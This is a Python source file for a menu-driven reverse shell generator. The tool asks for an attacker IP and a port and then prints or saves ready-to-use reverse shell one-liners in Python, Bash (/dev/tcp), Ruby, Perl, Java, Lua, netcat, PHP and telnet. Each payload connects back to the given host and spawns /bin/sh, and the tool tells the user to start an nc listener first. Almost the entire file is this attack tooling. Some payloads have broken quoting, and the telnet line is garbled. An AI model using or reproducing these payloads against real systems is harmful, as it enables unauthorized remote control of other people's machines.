
class color:
	PURPLE = '\033[95m'
	CYAN = '\033[96m'
	DARKCYAN = '\033[36m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'


class SHELL:
	def main():
		print(f'''

		
	███╗░░░███╗██╗░██████╗████████╗░░░░██╗██████╗░███████╗██╗░░░██╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
	████╗░████║██║██╔════╝╚══██╔══╝░░░██╔╝██╔══██╗██╔════╝██║░░░██║██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
	██╔████╔██║██║╚█████╗░░░░██║░░░░░██╔╝░██████╔╝█████╗░░╚██╗░██╔╝╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
	██║╚██╔╝██║██║░╚═══██╗░░░██║░░░░██╔╝░░██╔══██╗██╔══╝░░░╚████╔╝░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
	██║░╚═╝░██║██║██████╔╝░░░██║░░░██╔╝░░░██║░░██║███████╗░░╚██╔╝░░██████╔╝██║░░██║███████╗███████╗███████╗
	╚═╝░░░░░╚═╝╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░░░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝


		[1] Python Reverse Shell
		[2] Python3 Reverse Shell
		[3] Golang Reverse Shell (Coming Soon...)
		[4] Bash Reverse Shell
		[5] Ruby Reverse Shell
		[6] Perl Reverse Shell
		[7] C Reverse Shell (Coming Soon...)
		[8] Java Reverse Shell
		[9] Lua Reverse Shell
		[10] Netcat Reverse Shell
		[11] PHP Reverse Shell
		[12] Telnet Reverse Shell



			''')
		while True:
			payloadtype = input("Number<1-17>: ")
			ipaddress = input("Your IP: ")
			port = input("Specificed Port: ")
			save = input("Save Reverse Shell To A File(Yes/No): ")
			if save == "Yes":
				fileName = input("File Name: ")
			else:
				print("Save File - " + color.BOLD + color.RED + "False" + color.END)


# Define Reverse Shells
			reverse_shells = {
				1:f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ipaddress}','{port}'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'",
				2:f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ipaddress}','{port}'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'",
				3:f"Not Available As Of Now.",
				4:f"bash -i >& /dev/tcp/{ipaddress}/{port} 0>&1",
				5:f"ruby -rsocket -e'exit if fork;c=TCPSocket.new('{ipaddress}','{port}');" + "loop{c.gets.chomp!;(exit! if $_=='exit');($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts 'failed: #{$_}'}",
				6:f"perl -e 'use Socket;$i='{ipaddress}';$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i))))" + "{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'",
				7:f"Not Available As Of Now",
				8:f"Runtime r = Runtime.getRuntime();Process p = r.exec('/bin/bash -c 'exec 5<>/dev/tcp/{ipaddress}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'');p.waitFor();",
				9:f"lua -e 'require('socket');require('os');t=socket.tcp();t:connect('{ipaddress}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');'",
				10:f"nc -e /bin/sh {ipaddress} {port}",
				11:f"php -r '$sock=fsockopen('{ipaddress}','{port}');$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
				12:f"telnet {ipaddress} 8080 | /bin/sh | telnet {port} 8081 - Setup Two Listeners | nc -lvnp 8080 | nc -lvnp 8081"			
		}
			
			if save.strip() == "Yes":
				with open(str(fileName), "a+") as f:
					for key, value in reverse_shells.items():
						if int(payloadtype.strip()) == int(key): 
							f.write(color.BOLD + f"Reverse Shell --> {reverse_shells[int(key)]}" + color.END)
							f.write(f"\n Run nc -lvnp {port} before executing the Reverse Shell.")
							f.close()

			elif save.strip() == "No":
				for key, value in reverse_shells.items():
					if int(payloadtype.strip()) == int(key):
						print(color.BOLD + f"Reverse Shell --> {reverse_shells[int(key)]}" + color.END)
						print(f"Run nc -lvnp {port} before executing the Reverse Shell.")

			else:
				print("Invalid Input.")






	
			

		


			


